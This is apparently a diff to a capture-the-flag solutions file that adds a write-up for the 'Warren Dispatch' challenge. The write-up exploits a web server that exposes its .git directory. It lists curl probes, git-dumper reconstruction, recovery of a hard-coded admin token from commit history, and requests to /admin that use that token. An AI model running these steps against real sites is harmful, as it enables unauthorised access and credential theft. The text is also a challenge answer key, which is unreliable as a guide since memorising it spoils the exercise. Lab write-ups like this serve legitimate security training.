@@ -141,3 +141,51 @@ script to copy the flag into the backup itself, then downloading that.
      ```bash
      tar xf backup.tgz -O big-loot.txt
      ```
+
+---
+
+## Warren Dispatch (exposed .git history, Medium)
+
+TLDR: The site ships its `.git` directory, so the full source history is
+downloadable. An admin token was hard-coded in the first commit and later
+"removed" by moving it to an env var - but git history keeps the old blob.
+Recover the token from the old commit and use it against `/admin` to read the flag.
+
+**Steps**
+
+1. Browse to `http://<host>:8004/`. The footer mentions a staff console at
+   `/admin` (which returns `401` without a token). Probe for an exposed repo:
+
+   ```bash
+   curl 'http://<host>:8004/.git/HEAD'      # -> ref: refs/heads/master
+   ```
+
+   That file being served means the whole `.git` is exposed.
+
+2. Reconstruct the repo with [git-dumper](https://github.com/arthaud/git-dumper):
+
+   ```bash
+   git-dumper 'http://<host>:8004/.git/' loot
+   cd loot
+   ```
+
+3. Read the history. The token lived in `config.py` before it was moved to an
+   env var, so the removal diff hands it to you:
+
+   ```bash
+   git log --oneline
+   git log -p -- config.py        # the older commit shows ADMIN_TOKEN = "warren-..."
+   ```
+
+   (`git show <first-commit>:config.py` works too.)
+
+4. Use the recovered token against the admin console to print the flag:
+
+   ```bash
+   curl 'http://<host>:8004/admin?token=warren-<recovered>'
+   # or: curl -H 'Authorization: Bearer warren-<recovered>' 'http://<host>:8004/admin'
+   ```
+
+**Note**: the token is minted fresh every time the burrow starts (it is baked
+into the git history at plant time, never committed to the pwn-warren repo), so
+a token you dumped before a restart will stop working - just re-dump.
